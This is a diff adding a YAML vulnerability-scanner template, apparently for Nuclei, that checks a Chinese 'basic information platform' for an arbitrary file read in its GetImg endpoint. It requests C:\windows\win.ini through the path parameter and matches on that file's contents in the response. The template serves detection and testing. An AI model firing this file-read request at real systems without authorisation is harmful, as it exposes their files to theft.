@@ -1,0 +1,29 @@
+id: poc-yaml-infoearth-basic-information-platform-getimg-anyfile-read
+info:
+  name: 地大信息-基础信息平台 GetImg 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/SystemManage/BaseProject/GetImg?path=C:\\windows\\win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[files]"
+          - "bit app support"
+        part: body
+      - type: word
+        words:
+          - "image/jpeg"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
